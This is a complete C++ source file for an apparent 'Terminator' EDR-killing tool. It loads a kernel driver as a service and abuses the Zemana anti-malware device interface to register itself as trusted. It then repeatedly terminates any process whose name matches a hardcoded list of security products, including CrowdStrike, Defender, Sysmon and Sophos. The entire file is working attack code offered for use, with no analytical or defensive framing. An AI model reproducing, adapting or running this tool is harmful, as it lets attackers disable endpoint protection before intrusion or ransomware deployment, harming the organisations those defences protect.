#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>

#define IOCTL_REGISTER_PROCESS 0x80002010

#define IOCTL_TERMINATE_PROCESS 0x80002048

const char* g_serviceName = "Terminator";

const char* const g_edrlist[] = {
	"activeconsole", "anti malware",    "anti-malware",
	"antimalware",   "anti virus",      "anti-virus",
	"antivirus",     "appsense",        "authtap",
	"avast",         "avecto",          "canary",
	"carbonblack",   "carbon black",    "cb.exe",
	"ciscoamp",      "cisco amp",       "countercept",
	"countertack",   "cramtray",        "crssvc",
	"crowdstrike",   "csagent",         "csfalcon",
	"csshell",       "cybereason",      "cyclorama",
	"cylance",       "cyoptics",        "cyupdate",
	"cyvera",        "cyserver",        "cytray",
	"darktrace",     "defendpoint",     "defender",
	"eectrl",        "elastic",         "endgame",
	"f-secure",      "forcepoint",      "fireeye",
	"groundling",    "GRRservic",       "inspector",
	"ivanti",        "kaspersky",       "lacuna",
	"logrhythm",     "malware",         "mandiant",
	"mcafee",        "morphisec",       "msascuil",
	"msmpeng",       "nissrv",          "omni",
	"omniagent",     "osquery",         "palo alto networks",
	"pgeposervice",  "pgsystemtray",    "privilegeguard",
	"procwall",      "protectorservic", "qradar",
	"redcloak",      "secureworks",     "securityhealthservice",
	"semlaunchsv",   "sentinel",        "sepliveupdat",
	"sisidsservice", "sisipsservice",   "sisipsutil",
	"smc.exe",       "smcgui",          "snac64",
	"sophos",        "splunk",          "srtsp",
	"symantec",      "symcorpu",        "symefasi",
	"sysinternal",   "sysmon",          "tanium",
	"tda.exe",       "tdawork",         "tpython",
	"vectra",        "wincollect",      "windowssensor",
	"wireshark",     "threat",          "xagt.exe",
	"xagtnotif.exe" };

int g_edrlistSize = sizeof(g_edrlist) / sizeof(g_edrlist[0]);

BOOL loadDriver(char* driverPath) {
	SC_HANDLE hSCM, hService;

	// Open a handle to the SCM database
	hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hSCM == NULL)
		return (1);

	// Check if the service already exists
	hService = OpenServiceA(hSCM, g_serviceName, SERVICE_ALL_ACCESS);
	if (hService != NULL) {
		printf("Service already exists.\n");

		// Start the service if it"s not running
		SERVICE_STATUS serviceStatus;
		if (!QueryServiceStatus(hService, &serviceStatus)) {
			CloseServiceHandle(hService);
			CloseServiceHandle(hSCM);
			return (1);
		}

		if (serviceStatus.dwCurrentState == SERVICE_STOPPED) {
			if (!StartServiceA(hService, 0, nullptr)) {
				CloseServiceHandle(hService);
				CloseServiceHandle(hSCM);
				return (1);
			}

			printf("Starting service...\n");
		}

		CloseServiceHandle(hService);
		CloseServiceHandle(hSCM);
		return (0);
	}

	// Create the service
	hService = CreateServiceA(hSCM, g_serviceName, g_serviceName, SERVICE_ALL_ACCESS,
		SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
		SERVICE_ERROR_IGNORE, driverPath, NULL, NULL, NULL,
		NULL, NULL);

	if (hService == NULL) {
		CloseServiceHandle(hSCM);
		return (1);
	}

	printf("Service created successfully.\n");

	// Start the service
	if (!StartServiceA(hService, 0, nullptr)) {
		CloseServiceHandle(hService);
		CloseServiceHandle(hSCM);
		return (1);
	}

	printf("Starting service...\n");

	CloseServiceHandle(hService);
	CloseServiceHandle(hSCM);

	return (0);
}

char* toLowercase(const char* str) {
	char* lower_str = _strdup(str);
	for (int i = 0; lower_str[i]; i++) {
		lower_str[i] = tolower((unsigned char)lower_str[i]);
	}
	return lower_str;
}

int isInEdrlist(const char* pn) {
	char* tempv = toLowercase(pn);
	for (int i = 0; i < g_edrlistSize; i++) {
		if (strstr(tempv, g_edrlist[i]) != NULL) {
			free(tempv);
			return (1);
		}
	}
	free(tempv);
	return (0);
}

DWORD
checkEDRProcesses(HANDLE hDevice) {
	unsigned int procId = 0;
	unsigned int pOutbuff = 0;
	DWORD bytesRet = 0;
	int ecount = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnap != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32 pE;
		pE.dwSize = sizeof(pE);

		if (Process32First(hSnap, &pE)) {
			do {
				char exeName[MAX_PATH];
				wcstombs(exeName, pE.szExeFile, MAX_PATH);

				if (isInEdrlist(exeName)) {
					procId = (unsigned int)pE.th32ProcessID;
					if (!DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS, &procId,
						sizeof(procId), &pOutbuff, sizeof(pOutbuff),
						&bytesRet, NULL))
						printf("faild to terminate %ws !!\n", pE.szExeFile);
					else {
						printf("terminated %ws\n", pE.szExeFile);
						ecount++;
					}
				}
			} while (Process32Next(hSnap, &pE));
		}
		CloseHandle(hSnap);
	}
	return (ecount);
}

int main(void) {
	WIN32_FIND_DATAA fileData;
	HANDLE hFind;
	char FullDriverPath[MAX_PATH];
	BOOL once = 1;

	hFind = FindFirstFileA("Terminator.sys", &fileData);

	if (hFind != INVALID_HANDLE_VALUE) {  // file is found
		if (GetFullPathNameA(fileData.cFileName, MAX_PATH, FullDriverPath, NULL) !=
			0) {  // full path is found
			printf("driver path: %s\n", FullDriverPath);
		}
		else {
			printf("path not found !!\n");
			return (-1);
		}
	}
	else {
		printf("driver not found !!\n");
		return (-1);
	}
	printf("Loading %s driver .. \n", fileData.cFileName);

	if (loadDriver(FullDriverPath)) {
		printf("faild to load driver ,try to run the program as administrator!!\n");
		return (-1);
	}

	printf("driver loaded successfully !!\n");

	HANDLE hDevice =
		CreateFile(L"\\\\.\\ZemanaAntiMalware", GENERIC_WRITE | GENERIC_READ, 0,
			NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("Failed to open handle to driver !! ");
		return (-1);
	}

	unsigned int input = GetCurrentProcessId();

	if (!DeviceIoControl(hDevice, IOCTL_REGISTER_PROCESS, &input, sizeof(input),
		NULL, 0, NULL, NULL)) {
		printf("Failed to register the process in the trusted list %X !!\n",
			IOCTL_REGISTER_PROCESS);
		return (-1);
	}

	printf("process registed in the trusted list %X !!\n",
		IOCTL_REGISTER_PROCESS);

	printf(
		"Terminating ALL EDR/XDR/AVs ..\nkeep the program running to prevent "
		"windows service from restarting them\n");

	for (;;) {
		if (!checkEDRProcesses(hDevice))
			Sleep(1200);
		else
			Sleep(700);
	}

	system("pause");

	CloseHandle(hDevice);

	return 0;
}
